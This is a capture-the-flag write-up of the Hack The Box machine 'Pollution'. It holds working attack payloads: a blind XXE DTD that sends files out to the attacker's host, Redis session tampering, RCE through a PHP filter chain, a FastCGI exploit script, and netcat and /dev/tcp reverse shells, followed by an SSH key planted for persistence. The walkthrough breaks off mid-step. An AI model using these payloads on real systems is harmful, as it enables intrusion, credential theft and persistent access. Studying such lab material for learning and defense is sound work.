
Pollution showcases a lot web app techniques like Blind XXE, attaining RCE using LFI php filter gadget chains, and finally prototype pollution to escalate to root.


I'll start by performing a nmap scan.

Noted that 3 ports are open. SSH and Apache both flags that it is a Debian machine. Redis is also open as well which is interesting to take note of.

PHPSESSID also indicates that the apache website is running PHP.

```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ sudo nmap -sCV 10.129.228.126 -p-
[sudo] password for geedorah:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-04 19:59 +08
Nmap scan report for 10.129.228.126
Host is up (0.0051s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 db:1d:5c:65:72:9b:c6:43:30:a5:2b:a0:f0:1a:d5:fc (RSA)
|   256 4f:79:56:c5:bf:20:f9:f1:4b:92:38:ed:ce:fa:ac:78 (ECDSA)
|_  256 df:47:55:4f:4a:d1:78:a8:9d:cd:f8:a0:2f:c0:fc:a9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Home
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.04 seconds

```



Port 80
---

![](../../images/pollution/Pasted_image_20260504201907.png)

Looking through  the website, there's a potential domain called `collect.htb`.
![](../../images/pollution/Pasted_image_20260504201030.png)
I'll add it to my `/etc/hosts` file.
```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ grep collect.htb /etc/hosts
10.129.228.126  collect.htb
```


Also noted that we are able to register an account on the website.


I'll register with the account `geedorah:geedorah`.
![](../../images/pollution/Pasted_image_20260504202126.png)

![](../../images/pollution/Pasted_image_20260504202143.png)


There doesn't seem to be anything I can do even with a new logon session.
![](../../images/pollution/Pasted_image_20260504202154.png)


I'll attempt to run gobuster, which shows nothing interesting. The `-b` flag is used to blacklist the redirect `302`, as this website is redirecting any webpages that do not exist back to the home page.
```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ gobuster dir -u http://10.129.228.126 -w /home/geedorah/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -b 302
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.126
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/geedorah/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] Negative Status codes:   302
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 4740]
/assets               (Status: 301) [Size: 317] [--> http://10.129.228.126/assets/]
/register             (Status: 200) [Size: 4746]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================


```


I'll try fuzzing for subdomains next.
```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ ffuf -w /home/geedorah/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://collect.htb/ -H 'Host: FUZZ.collect.htb' -mc all  --fs 26197

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://collect.htb/
 :: Wordlist         : FUZZ: /home/geedorah/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.collect.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 26197
________________________________________________

forum                   [Status: 200, Size: 14098, Words: 910, Lines: 337, Duration: 48ms]
developers              [Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 4ms]
:: Progress: [19966/19966] :: Job [1/1] :: 269 req/sec :: Duration: [0:01:03] :: Errors: 0 ::


```

2 virtual hosts are found within the subdomains.

I'll add those 2 into my /etc/hosts, then visit them.
```
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ grep collect.htb /etc/hosts
10.129.228.126  collect.htb     developers.collect.htb  forum.collect.htb

```



**forum.collect.htb**

`forum.collect.htb` seems to be an forum page we can register an account on.
![](../../images/pollution/Pasted_image_20260504203356.png)


**developers.collect.htb**

`developers.collect.htb` requires authentication, nothing much I can do now.
![](../../images/pollution/Pasted_image_20260504203411.png)



With the websites we have found, I'll explore `forums.collect.htb`.

**forums.collect.htb**
---

This website shows a lot threads created.
![](../../images/pollution/Pasted_image_20260504203732.png)

I am able to click one of the threads and view its contents.
![](../../images/pollution/Pasted_image_20260504203756.png)

Looking at the thread `I had problems with the Pollution API`,
we see an attached file named **proxy_history.txt**.
![](../../images/pollution/Pasted_image_20260504203858.png)


Trying to download it shows you are required to register an account.
![](../../images/pollution/Pasted_image_20260504203953.png)


I'll register an account and try to download the file again.
![](../../images/pollution/Pasted_image_20260504204047.png)


We are now able to view the **proxy_history.txt** file.
![](../../images/pollution/Pasted_image_20260504204122.png)



Looking at this file , there are indicators of it being burp traffic collected from logs.

![](../../images/pollution/Pasted_image_20260504204848.png)

As each item comprises of a request made, I'll filter the url using grep, and see what interesting requests can be found.

```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ grep '<url>' proxy_history.txt
    <url><![CDATA[https://storyset.com/for-figma]]></url>
    <url><![CDATA[http://collect.htb/set/role/admin]]></url>
    <url><![CDATA[http://detectportal.firefox.com/canonical.html]]></url>
    <url><![CDATA[http://127.0.0.1:3000/auth/login]]></url>
    <url><![CDATA[http://collect.htb/]]></url>
    <url><![CDATA[http://detectportal.firefox.com/canonical.html]]></url>
    <url><![CDATA[http://forum.collect.htb/forumdisplay.php?fid=2]]></url>
    <url><![CDATA[http://forum.collect.htb/jscripts/jeditable/jeditable.min.js]]></url>
    <url><![CDATA[http://forum.collect.htb/jscripts/inline_edit.js?ver=1821]]></url>
    <url><![CDATA[http://forum.collect.htb/jscripts/rating.js?ver=1821]]></url>


```

There are many requests made, but `http://collect.htb/set/role/admin` stands out like a sore thumb.

I'll check out this request using grep again.
```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ grep 'http://collect.htb/set/role/admin' proxy_history.txt -A 20 -B 2
  <item>
    <time>Thu Sep 22 18:29:34 BRT 2022</time>
    <url><![CDATA[http://collect.htb/set/role/admin]]></url>
    <host ip="192.168.1.6">collect.htb</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/set/role/admin]]></path>
    <extension>null</extension>
    <request base64="true"><![CDATA[UE9TVCAvc2V0L3JvbGUvYWRtaW4gSFRUUC8xLjENCkhvc3Q6IGNvbGxlY3QuaHRiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IHB0LUJSLHB0O3E9MC44LGVuLVVTO3E9MC41LGVuO3E9MC4zDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IFBIUFNFU1NJRD1yOHFuZTIwaGlnMWszbGk2cHJnazkxdDMzag0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAzOA0KDQp0b2tlbj1kZGFjNjJhMjgyNTQ1NjEwMDEyNzc3MjdjYjM5N2JhZg==]]></request>
    <status>302</status>
    <responselength>296</responselength>
    <mimetype></mimetype>
    <response base64="true"><![CDATA[SFRUUC8xLjEgMzAyIEZvdW5kDQpEYXRlOiBUaHUsIDIyIFNlcCAyMDIyIDIxOjMwOjE0IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU0IChEZWJpYW4pDQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCkxvY2F0aW9uOiAvaG9tZQ0KQ29udGVudC1MZW5ndGg6IDANCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOA0KDQo=]]></response>
    <comment></comment>
  </item>
  <item>
    <time>Thu Sep 22 18:29:46 BRT 2022</time>
    <url><![CDATA[http://detectportal.firefox.com/canonical.html]]></url>
    <host ip="34.107.221.82">detectportal.firefox.com</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[GET]]></method>


```

From the output, the request and response is base64 encoded.
```bash

┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ echo -n 'UE9TVCAvc2V0L3JvbGUvYWRtaW4gSFRUUC8xLjENCkhvc3Q6IGNvbGxlY3QuaHRiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDQuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IHB0LUJSLHB0O3E9MC44LGVuLVVTO3E9MC41LGVuO3E9MC4zDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkNvbm5lY3Rpb246IGNsb3NlDQpDb29raWU6IFBIUFNFU1NJRD1yOHFuZTIwaGlnMWszbGk2cHJnazkxdDMzag0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAzOA0KDQp0b2tlbj1kZGFjNjJhMjgyNTQ1NjEwMDEyNzc3MjdjYjM5N2JhZg==' | base64 -d

#Request
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf                                                                                                                                                                         
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ echo -n 'SFRUUC8xLjEgMzAyIEZvdW5kDQpEYXRlOiBUaHUsIDIyIFNlcCAyMDIyIDIxOjMwOjE0IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU0IChEZWJpYW4pDQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCkxvY2F0aW9uOiAvaG9tZQ0KQ29udGVudC1MZW5ndGg6IDANCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOA0KDQo=' | base64 -d

#Response
HTTP/1.1 302 Found
Date: Thu, 22 Sep 2022 21:30:14 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /home
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8


```

With this info, it seems that we are able to set our current user as admin on `collect.htb` with this API endpoint.

I'll try this via using burpsuite to capture a random request on `collect.htb` with our logon session.
![](../../images/pollution/Pasted_image_20260504205940.png)

I'll change this to a POST request with the api endpoint `/set/role/admin`.


Sending the API requests shows the redirect is now `/admin` . This is indicative of us gaining administrative access.
![](../../images/pollution/Pasted_image_20260504210230.png)


I'll look into the `/admin` directory.




This seems to be an administrator panel.
![](../../images/pollution/Pasted_image_20260504210326.png)


I can register an account in POLLUTION API
![](../../images/pollution/Pasted_image_20260504210409.png)


I can register a user, and try to use it on `developers.collect.htb`, but it won't work.



Taking a deeper look into the request, a XML request is being sent.
![](../../images/pollution/Pasted_image_20260504210605.png)


I can try to perform a XXE injection attack.



Testing the typical LFI XXE payload, this seems like a blind XXE injection.

![](../../images/pollution/Pasted_image_20260504210908.png)



**XXE POC**
```
manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE username [<!ENTITY % remote SYSTEM "http://10.10.16.46/xxe.dtd">%remote;]><root><method>POST</method><uri>/auth/register</uri><user><username>%26content;</username><password>geedorah</password></user></root>
```

I am able to make `collect.htb` probe for a .dtd file, which I can then use to perform data exfiltration back to my hosted python server.
![](../../images/pollution/Pasted_image_20260504211317.png)


I'll do a simple data exfiltration test via **xxe.dtd**.
```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/sites-enabled/developers.collect.htb.conf">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.16.46/?content=%file;'>">
%oob;
```


I am able to get a output.
![](../../images/pollution/Pasted_image_20260504214625.png)

If I base64 decode the content here, the hostname `pollution` is reflected.  
![](../../images/pollution/Pasted_image_20260504214728.png)


After confirming XXE OOB exfiltration, I can try to exfiltrate other data.

Since we have already footprinted `collect.htb` to be hosted in apache, it's often worth checking for virtual host config files. Since it is confirmed that there are virtual hosts running under the `collect.htb` domain, it is common practice for config files to be stored in `/etc/apache2/sites-enabled/collect.htb.conf`.

With this, I'll modify my dtd file to exfiltrate `collect.htb.conf`

**xxe.dtd**
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/sites-enabled/collect.htb.conf">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.16.46/?content=%file;'>">
%oob;
```

Sending the request on burp suite repeater, there is indeed a virtual host config file.
![](../../images/pollution/Pasted_image_20260504220503.png)

![](../../images/pollution/Pasted_image_20260504220604.png)


I'll check for `developers.collect.htb.conf` next, as I still do not have access to this website.

![](../../images/pollution/Pasted_image_20260504220725.png)

Another hit. This time, a config file `/var/www/developers/.htpasswd` is leaked.
![](../../images/pollution/Pasted_image_20260504220737.png)

I'll edit xxe.dtd and see if I'm able to read `.htpasswd`.
![](../../images/pollution/Pasted_image_20260504221024.png)

A credential pair is found for  **developers_group**
```
developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
```

Running hashcat detects the hash as  Apache MD5, and successfuly cracked with the password `r0cket`.
``` shell
C:\ hashcat.exe hashes.txt C:\Cracker\rockyou.txt

Host memory allocated for this attack: 1409 MB (6764 MB free)

Dictionary cache hit:
* Filename..: C:\Cracker\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1:r0cket

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1
Time.Started.....: Mon May 04 22:14:08 2026 (1 sec)
Time.Estimated...: Mon May 04 22:14:09 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (C:\Cracker\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 17013.1 kH/s (12.33ms) @ Accel:8 Loops:1000 Thr:512 Vec:1
Speed.#02........:    35103 H/s (15.04ms) @ Accel:20 Loops:124 Thr:256 Vec:1
Speed.#*.........: 17048.2 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 245760/14344384 (1.71%)
Rejected.........: 0/245760 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1000
Restore.Sub.#02..: Salt:0 Amplifier:0-1 Iteration:124-248
Candidate.Engine.: Device Generator
Candidates.#01...: VANESSA -> PETUNIA
Candidates.#02...: 123456 -> allison1
Hardware.Mon.#01.: Temp: 59c Fan:  0% Util:100% Core:2805MHz Mem:10251MHz Bus:16
Hardware.Mon.#02.: Temp:  0c Fan:  0% Util:  0% Core: 600MHz Mem:3200MHz Bus:16

Started: Mon May 04 22:13:54 2026
Stopped: Mon May 04 22:14:10 2026
```


developers.collect.htb
---
Trying our new  pair of credentials finally allows us  to authenticate into `developers.collect.htb`, which presents another login page.
![](../../images/pollution/Pasted_image_20260504222118.png)



Using XXE, I'll  exfiltrate `index.php` hosted on `/var/www/developers` which was leaked via `developers.collect.htb.conf`.


There is insufficient validation on `$_SESSION['auth'] != True)` . This is not a true equality check, which means that a type juggling conversion attack can be performed. However, there needs to be a way to inject into the session auth parameter. Even though this is not relevant in the box, it's still something that's good to know.

Also worth taking note that there is a LFI vulnerability via the GET `page` parameter if we are authenticated. 


**index.php**
![](../../images/pollution/Pasted_image_20260504222630.png)

`index.php` also requires **bootstrap.php** to run, I'll exfiltrate it via XXE as well.



bootstrap.php reveals a redis database, with the auth password `COLLECTR3D1SPASS`.

**bootstrap.php**
![](../../images/pollution/Pasted_image_20260504223416.png)



Shell on WWW-DATA
---

Based on our nmap scan, redis is indeed running. I'll try to authenticate.


**redis**

The password `COLLECTR3D1SPASS` worked.

```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ redis-cli -h 10.129.228.126 --pass COLLECTR3D1SPASS
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.129.228.126:6379>

```



Dumping the database using `KEYS *`, it shows that `collect.htb`'s PHP session is being stored on the redis database.

```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ redis-cli -h 10.129.228.126 --pass COLLECTR3D1SPASS
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.129.228.126:6379> KEYS *
1) "PHPREDIS_SESSION:ca4ik0nn3g1f60egv74qvis1iu"
2) "PHPREDIS_SESSION:ves8eq6r6p9pruh2ievc9n98ll"
10.129.228.126:6379>

```

Getting the value of the session, it shows a PHP serialised session data, belonging  to my user `geedorah`.
```bash
10.129.228.126:6379> KEYS *
1) "PHPREDIS_SESSION:ves8eq6r6p9pruh2ievc9n98ll"
10.129.228.126:6379> get PHPREDIS_SESSION:ves8eq6r6p9pruh2ievc9n98ll
"username|s:8:\"geedorah\";role|s:5:\"admin\";"
10.129.228.126:6379>

```

With the auth session parameter in mind, I can abuse this by setting my controlled redis session with `auth|b:1;` , that puts the boolean flag to true on the auth parameter, validating my access to **index.php**.


**index.php**
```bash
if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {            
    die(header('Location: /login.php'));                                 
}   
```

I'll perform the SET command.
```
10.129.228.126:6379> get PHPREDIS_SESSION:ves8eq6r6p9pruh2ievc9n98ll
"username|s:8:\"geedorah\";role|s:5:\"admin\";"
10.129.228.126:6379> SET PHPREDIS_SESSION:ves8eq6r6p9pruh2ievc9n98ll "auth|s:1:\"1\";"
OK
10.129.228.126:6379> get PHPREDIS_SESSION:ves8eq6r6p9pruh2ievc9n98ll
"auth|s:1:\"1\";"
10.129.228.126:6379>
```

If i go back to `developers.collect.htb` while using the  cookie `ves8eq6r6p9pruh2ievc9n98ll` , I'll be redirected to the home page.
![](../../images/pollution/Pasted_image_20260504225947.png)


**LFI RCE via php filter gadget chain**
---


```
<?php include($_GET['page'] . ".php"); ?>
```
 
Since `index.php` appends any input from the `page` parameter with `.php`, it would be difficult to read files that are not in php. However, it is possible to get RCE via LFI without uploading a file using this PHP Filter gadget chain injection referenced from Synacktiv's github on
https://github.com/synacktiv/php_filter_chain_generator .



**POC**


I'll run the python script to generate the filter wrapper, which i'll then append to the page parameter on my burp request.
```bash
┌──(geedorah㉿kali)-[~/…/htb/hard/pollution/php_filter_chain_generator]
└─$ python3 php_filter_chain_generator.py --chain '<?php system($_REQUEST["cmd"]); ?>' 
php://filter<SNIP>resource=php://temp
```

```
GET /?page=php://filter<SNIP>resource=php://temp&cmd=whoami 
```

Running whoami confirms we have RCE.
![](../../images/pollution/Pasted_image_20260504233624.png)


I'll then setup my listener, and run a simple bash reverse shell command to get a foothold as `www-data` .
```
GET /?page=php://filter<SNIP>resource=php://temp&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.16.46+4445+>/tmp/f
```

```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard]
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.16.46] from (UNKNOWN) [10.129.228.126] 50724
sh: 0: can't access tty; job control turned off

```

I'll then proceed to upgrade my shell via python's `os` library.
```bash
┌──(geedorah㉿kali)-[~/Desktop/htb/hard]
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.16.46] from (UNKNOWN) [10.129.228.126] 50724
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@pollution:~/developers$

www-data@pollution:~/developers$ ^Z
zsh: suspended  nc -lnvp 4445

┌──(geedorah㉿kali)-[~/Desktop/htb/hard]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 4445

www-data@pollution:~/developers$ stty rows 50 columns 208
www-data@pollution:~/developers$ export XTERM=tmux-256color
www-data@pollution:~/developers$ ls -la
total 120
drwxr-xr-x 3 root root  4096 Oct 27  2022 .
drwxr-xr-x 5 root root  4096 Nov 18  2022 ..
-rw-r--r-- 1 root root    17 Oct 27  2022 .htaccess
-rw-r--r-- 1 root root    55 Oct 27  2022 .htpasswd
drwxr-xr-x 4 root root  4096 Oct 26  2022 assets
-rw-r--r-- 1 root root   144 Oct 27  2022 bootstrap.php
-rw-r--r-- 1 root root 25225 Oct 26  2022 calendar.php
-rw-r--r-- 1 root root  4106 Oct 26  2022 footer.php
-rw-r--r-- 1 root root  1789 Oct 27  2022 header.php
-rwxr-xr-x 1 root root  6995 Oct 27  2022 home.php
-rwxr-xr-x 1 root root   882 Oct 26  2022 index.php
-rwxr-xr-x 1 root root  4512 Oct 27  2022 login.php
-rw-r--r-- 1 root root   194 Oct 26  2022 logout.php
-rw-r--r-- 1 root root 30141 Oct 27  2022 projects.php
www-data@pollution:~/developers$

```


Shell as victor
---

Running `ps -ef` shows a php-fpm master process running.
![](../../images/pollution/Pasted_image_20260504235228.png)


Checking `php-fpm.conf` will point us to `www.conf`. 

```bash
www-data@pollution:~/developers$ cat /etc/php/8.1/fpm/php-fpm.conf 
<SNIP>
include=/etc/php/8.1/fpm/pool.d/*.conf
www-data@pollution:~/developers$ ls -la /etc/php/8.1/fpm/pool.d
total 52
drwxr-xr-x 2 root root  4096 Nov 29  2022 .
drwxr-xr-x 4 root root  4096 Nov 29  2022 ..
-rw-r--r-- 1 root root 41742 Nov 18  2022 www.conf



```

Checking `www.conf` shows victor listening on port 9000.

```bash
www-data@pollution:~/developers$ cat /etc/php/8.1/fpm/pool.d/www.conf | grep -v '; ' | grep .
[victor]
;prefix = /path/to/pools/$pool
user = victor
group = victor
listen = 127.0.0.1:9000
;listen.backlog = 511
listen.owner = www-data
listen.group = www-data
;listen.mode = 0660
;listen.acl_users =
;listen.acl_groups =
;listen.allowed_clients = 127.0.0.1
pm = dynamic
pm.max_children = 5
pm.start_servers = 2
pm.min_spare_servers = 1
pm.max_spare_servers = 3
;pm.max_spawn_rate = 32
;pm.process_idle_timeout = 10s;
;pm.max_requests = 500
;

```

This is interesting as victor is the only user we can see on /home.
```
www-data@pollution:~/developers$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Nov 21  2022 .
drwxr-xr-x 19 root   root   4096 Nov 21  2022 ..
drwx------ 16 victor victor 4096 Nov 21  2022 victor
www-data@pollution:~/developers$

```

Googling `php-fpm hacktricks` shows that this is vulnerable to `FastCGI` RCE.
![](../../images/pollution/Pasted_image_20260504235921.png)


Referencing [hacktricks](https://hacktricks.wiki/en/network-services-pentesting/9000-pentesting-fastcgi.html) website, I'll use the bash script POC provided.
```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('id'); echo '-->';" 
FILENAMES="/var/www/developers/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```


Running the POC in the shell, I can confirm that the script is being ran as the `victor` user.

```
www-data@pollution:/tmp$ chmod +x poc.sh
www-data@pollution:/tmp$ ./poc.sh localhost
Status: 302 Found
Set-Cookie: PHPSESSID=rr5u4frupt9fm9h55so405bhsm; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8

<!--uid=1002(victor) gid=1002(victor) groups=1002(victor)
-->www-data@pollution:/tmp$
www-data@pollution:/tmp$
www-data@pollution:/tmp$
```


I'll create a bash reverse shell in the foothold, and rerun the POC with my reverse shell payload, granting us a shell as `victor`.

**shell.sh**
```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.46/4445 0>&1'
```


**poc.sh**
```
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('/tmp/shell.sh'); echo '-->';" 
FILENAMES="/var/www/developers/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```




```bash

# www-data
www-data@pollution:/tmp$ chmod +x shell.sh 
www-data@pollution:/tmp$ ./poc.sh localhost  


# listener
┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.16.46] from (UNKNOWN) [10.129.228.126] 36042
bash: cannot set terminal process group (972): Inappropriate ioctl for device
bash: no job control in this shell
victor@pollution:/var/www/developers$ whoami
whoami
victor
victor@pollution:/var/www/developers$

```

After getting a shell on victor, I'll transfer my ssh public key into .ssh and get a SSH shell.
```bash
victor@pollution:~$ cd .ssh
cd .ssh
victor@pollution:~/.ssh$ ls -la
ls -la
total 8
drwx------  2 victor victor 4096 Nov 21  2022 .
drwx------ 16 victor victor 4096 Nov 21  2022 ..
victor@pollution:~/.ssh$ echo -n 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKJvTrl3VS2/Vb+fStTZC1f1u98paMtzhMcpbP3s5esw geedorah@kali
<3VS2/Vb+fStTZC1f1u98paMtzhMcpbP3s5esw geedorah@kali
> ' > authorized_keys
' > authorized_keys
victor@pollution:~/.ssh$ ls -la
ls -la
total 12
drwx------  2 victor victor 4096 May  5 00:14 .
drwx------ 16 victor victor 4096 Nov 21  2022 ..
-rw-r--r--  1 victor victor   95 May  5 00:14 authorized_keys
victor@pollution:~/.ssh$

```

```bash

┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ ssh-keygen -t ed25519
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/geedorah/.ssh/id_ed25519): bob
Enter passphrase for "bob" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in bob
Your public key has been saved in bob.pub
The key fingerprint is:
SHA256:igVF+IDAx9rKNAgH3Ha+FG6oQOgyjVTxAj/+JgFW284 geedorah@kali
The key's randomart image is:
+--[ED25519 256]--+
|*++=.oo          |
|o=*=*+           |
|**==*=.          |
|B=+o=*.          |
|=.+ooEo S        |
| +  o+ .         |
|   ..o.          |
|    o            |
|                 |
+----[SHA256]-----+

┌──(geedorah㉿kali)-[~/Desktop/htb/hard/pollution]
└─$ cat bob.pub
